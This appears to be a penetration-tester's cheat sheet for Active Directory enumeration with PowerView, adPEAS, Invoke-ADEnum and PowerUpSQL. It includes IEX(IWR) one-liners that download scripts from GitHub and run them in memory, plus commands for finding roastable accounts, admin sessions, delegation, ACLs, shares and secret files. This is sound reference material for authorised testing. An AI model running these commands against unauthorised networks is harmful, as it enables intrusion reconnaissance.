## Enumeration Tools

* **adPEAS:** https://github.com/61106960/adPEAS
* **Invoke-ADEnum:** https://github.com/Leo4j/Invoke-ADEnum
* **PowerUpSQL:** https://github.com/NetSPI/PowerUpSQL
* **PowerView:** https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

```powershell
# adPEAS
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1);Invoke-adPEAS

# Invoke-ADEnum
IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum

# PowerUpSQL
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1)

# PowerView
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
```

>**ℹ️ Info:**
>
>The following error: `IWR : The request was aborted: Could not create SSL/TLS secure channel.` can be fixed by forcing PowerShell to use TLS 1.2:: 
>
>`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`

---
## Enumeration

>**ℹ️ Info:**
>
>PowerView is used primarily on this page unless stated otherwise.


### Domain Enumeration

```powershell
# Get Domain Information
Get-Domain

# Get Domain Information of different Domain
Get-Domain -Domain <Domain>

# Get Domain SID
Get-DomainSID
```

### Domain Controller Enumeration

```powershell
# Get Domain Controllers
Get-DomainController

# Get Domain Controllers of different Domain
Get-DomainController -Domain <Domain>

# Get Primary Domain Controller
Get-Domain | Select-Object 'PdcRoleOwner'

# Get Primary Domain Controller of different Domain
Get-Domain -Domain <Domain> | Select-Object 'PdcRoleOwner'
```

### Domain Policy Enumeration

```powershell
# Get Domain Policy Information
Get-DomainPolicy

# Get Domain Policy Information of different Domain
Get-DomainPolicy -Domain <Domain>

# Get Domain Password Policy Information
(Get-DomainPolicy)."SystemAccess"

# Get Domain Kerberos Policy Information
(Get-DomainPolicy)."KerberosPolicy"

# Get Domain Policy Information of different Domain
(Get-DomainPolicy -Domain <Domain>)."SystemAccess"
```

### Domain User Enumeration

```powershell
# Get Domain Users Information
Get-DomainUser

# Get Domain Users Information of different Domain
Get-DomainUser -Domain <Domain>

# Get specific Domain User Information
Get-DomainUser -Identity <User> -Properties *

# Get Domain Users With Descriptions
Get-DomainUser -LDAPFilter "Description=*" | Select Name,Description

# Get Domain Enabled Accounts
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name

# Get Domain Users and their Groups
Get-DomainUser -Properties name, MemberOf | fl

# Get Foreign Users
Find-ForeignUser

# Get last Domain User logged on
Get-NetLoggedon

# Get Domain Kerberoastable Accounts
Get-DomainUser -SPN | Select Name, ServicePrincipalName

# Get Domain AS-REP Roastable Accounts
Get-DomainUser -PreauthNotRequired -Verbose

# Get Constrained Delegation enabled Accounts
Get-DomainUser -TrustedToAuth | Select Name, msds-allowedtodelegateto

# Get Enterprise Admins
Get-NetGroup -GroupName "Enterprise Admins" -Domain contoso.local -FullData
```


### Domain User Hunting
```powershell
# Find all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess –Verbose

# Find computers where a domain admin (or specified user/group) has sessions 
Find-DomainUserLocation -Verbose 
Find-DomainUserLocation -UserGroupIdentity "StudentUsers"

# Find computers where a domain admin session is available and current user has admin access
Find-DomainUserLocation -CheckAccess

# Find computers (File Servers and Distributed File servers) where a domain admin session is available. 
Find-DomainUserLocation –Stealth
```

### Domain Group Enumeration

```powershell
# Get Domain Groups Information
Get-DomainGroup

# Get Domain Groups Information of different Domain
Get-DomainGroup -Domain <Domain>

# Get Domain Groups Name
Get-DomainGroup -Properties SamAccountName | Sort SamAccountName

# Get Domain Groups a User is in
Get-DomainGroup -UserName '<User>' -Properties name,description,distinguishedname

# Get Members of Domain Group
Get-DomainGroupMember -Identity <Group> -Recurse | Select Groupname,Membername | Sort Groupname

# Get Domain Groups and Members of Domain Groups
Get-DomainGroup | Get-DomainGroupMember | Select GroupName,MemberName | Sort GroupName

# Get Recursive search of Domain Groups
Get-DomainGroupMember -Identity "<Group>" -Recurse | Select GroupName,MemberName

# Get Domain Groups containing a specific word
Get-DomainGroup "*admin*" -Properties SamAccountName | Sort SamAccountName

# Get Domain Groups with Administrator privileges
Get-DomainGroup -AdminCount | select name,memberof,admincount,member | fl

# Get Foreign Groups
Find-ForeignGroup

# Get Local Groups
Get-NetLocalGroup

# Get Local Groups of different Computer
Get-NetLocalGroup -ComputerName <Hostname>

# Get Members of Local Group
Get-NetLocalGroupMember -ComputerName <Hostname> -GroupName <Group>

# Get Local Groups of Domain Controllers
Get-DomainController | Get-NetLocalGroup
```

### Domain Computer Enumeration

```powershell
# Get Domain Computers Information
Get-DomainComputer

# Get short Domain Computers Information
Get-DomainComputer | Select Name,Description,Operatingsystem | Sort Name

# Get Domain Computers Information of alive Computers
Get-DomainComputer -Ping

# Get short Domain Computers Information of alive Computers
Get-DomainComputer -Ping | Select Name,Description,Operatingsystem | Sort Name

# Get Domain Computers with Unconstrained Delegation enabled
Get-DomainComputer -Unconstrained | select Name

# Get Domain Computers with Constrained Delegation enabled
Get-DomainComputer -TrustedToAuth | select Name, msds-allowedtodelegateto

# Get Domain Computers with specific Operating System
Get-DomainComputer -OperatingSystem "Windows Server 2022*"
Get-DomainComputer -OperatingSystem "Windows Server 2019*"
Get-DomainComputer -OperatingSystem "Windows Server 2016*"
Get-DomainComputer -OperatingSystem "Windows Server 2012*"
Get-DomainComputer -OperatingSystem "Windows Server 2008*"
Get-DomainComputer -OperatingSystem "Windows Server 2003*"
Get-DomainComputer -OperatingSystem "Windows 11*"
Get-DomainComputer -OperatingSystem "Windows 10*"
Get-DomainComputer -OperatingSystem "Windows 7*"
Get-DomainComputer -OperatingSystem "Windows 8*"
Get-DomainComputer -OperatingSystem "Windows XP*"
```

### Domain Group Policy Enumeration

```powershell
# Get Domain GPOs
Get-DomainGPO
Get-DomainGPO -Properties DisplayName,CN

# Get Domain GPOs applied to Computer
Get-DomainGPO -ComputerIdentity <Hostname>.<Domain> | select DisplayName

# Get Domain GPOs applies to User
Get-DomainGPO -UserIdentity <SamAccountName> | Select DisplayName,CN

# Get Domain GPOs Restricted Groups
Get-NetGPOGroup -ResolveMembersToSIDs

# Get Domain GPOs Local Restricted Groups
Get-DomainGPOLocalGroup

# Get Domain GPOs Permissions
Get-DomainGPO | Get-ObjectAcl

# Get Domain GPO Restricted Groups and list each member of the groups
$GroupNames = Get-NetGPOGroup -ResolveMembersToSIDs | Select-Object -ExpandProperty "GroupName" ; foreach ($GroupName in $GroupNames) {$ModifiedGroupName = $GroupName -replace '^.*\\' ; Get-DomainGroupMember -Identity $ModifiedGroupName}
```

### Domain Organizational Unit Enumeration

```powershell
# Get Domain Organizational Units
Get-DomainOU
Get-DomainOU -Properties Name,Description,Gplink 

# Get Domain Organizational Units of different Domain
Get-DomainOU -Domain <Domain>

# Get GPO applied to Domain Organizational Unit
Get-DomainGPO -Identity '{<GPLink>}'
Get-DomainGPO -Identity '{6AC1786C-016F-11D2-945F-00C04fB984F9}' # Example

# Get Users in Local Group of Machines in any Organizational Unit using any GPO
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping
```

### Domain Acces Control List Enumeration

```powershell
# Get Domain ACLs
Get-DomainObjectAcl -ResolveGUIDs

# Get Domain ACLs of User
Get-DomainObjectAcl -Identity <User> -ResolveGUIDs

# Get Domain ACLs of Computer
Get-DomainObjectAcl -Identity <Hostname> -ResolveGUIDs

# Get Domain ACE of File
Get-PathAcl -Path "\\us-dc\sysvol"

# Get Interesting Domain ACLs of User
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<User>"}
```

### Domain Trust Enumeration

```powershell
# Get Domain Trusts
Get-DomainTrust

# Get Domain Trusts of different Domain
Get-DomainTrust -Domain <Domain>

# Get All Domain Trusts
Get-DomainTrustMapping

# Get Domain Forest
Get-Forest

# Get Domains inside the Forest
Get-ForestDomain

# Get Global Catalog of Forest
Get-NetForestCatalog

# Get Forest Trusts
Get-NetForestTrust
```

## Other Enumeration

### Domain Shares Enumeration

```powershell
# Get Domain Shares
Find-DomainShare

# Get Shares of Computer
Get-NetShare

# Get Shares of differente Computer
Get-NetShare -ComputerName <Hostname> 

# Get Readable Shares
Find-DomainShare -CheckShareAccess

# Get Interesting Files on Shares
Find-InterestingDomainShareFile

# Get Files containing Word
Get-Childitem -Path C:\ -Force -Include "secr*" -Recurse -ErrorAction SilentlyContinue
```

### MSSQL Enumeration
```powershell
# Get MSSQL instances
Get-SQLInstanceDomain

# Get MSSQL accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded - Verbose

# Get MSSQL information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
